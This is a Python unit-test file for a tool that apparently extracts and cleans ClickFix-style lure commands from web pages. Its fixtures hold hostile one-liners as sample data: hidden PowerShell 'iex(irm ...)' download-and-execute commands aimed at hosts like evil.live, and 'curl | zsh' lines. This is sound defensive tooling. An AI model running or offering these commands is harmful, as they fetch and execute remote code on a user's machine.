"""Tests for clickgrab_extract command recovery, incl. JSON-embedded repair."""
import os
import sys
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "clickfix"))

import clickgrab_extract as cg  # noqa: E402


class CleanJsonEmbeddedTest(unittest.TestCase):
    def test_cuts_over_capture_into_next_array_element(self):
        # per-OS JSON array: the Windows command overran into "macos"/"curl..."
        over = ('iex(irm \'https://copiose.org/lom/x\' -Headers @{\'X-WUA\'=\'abc\'})'
                '","macos":"curl -s ... | zsh",""')
        self.assertEqual(cg._clean_json_embedded(over),
                         "iex(irm 'https://copiose.org/lom/x' -Headers @{'X-WUA'='abc'})")

    def test_unescapes_json_escaped_slashes(self):
        esc = "iex(irm 'https:\\/\\/x\\/a')\", \"curl | zsh\""
        self.assertEqual(cg._clean_json_embedded(esc), "iex(irm 'https://x/a')")

    def test_leaves_normal_double_quoted_command_untouched(self):
        n = 'powershell -w hidden -c "iex(irm http://x/a.ps1)"'
        self.assertEqual(cg._clean_json_embedded(n), n)

    def test_leaves_in_command_double_quoted_array_untouched(self):
        n = 'powershell -c "$a=@(\\"a\\",\\"b\\");iex $a"'
        self.assertEqual(cg._clean_json_embedded(n), n)

    def test_recover_commands_returns_clean_windows_payload(self):
        html = ('<script>var steps={"windows":"iex(irm \'https://evil.live/p\' '
                '-Headers @{\'X-WUA\'=\'z\'})","macos":"curl -s x | zsh"};</script>')
        cmds = cg.recover_commands(html)
        self.assertTrue(cmds)
        top = cmds[0]["text"]
        self.assertIn("iex(irm 'https://evil.live/p'", top)
        self.assertNotIn("macos", top)      # did not bleed into the next element
        self.assertNotIn('","', top)


if __name__ == "__main__":
    unittest.main()
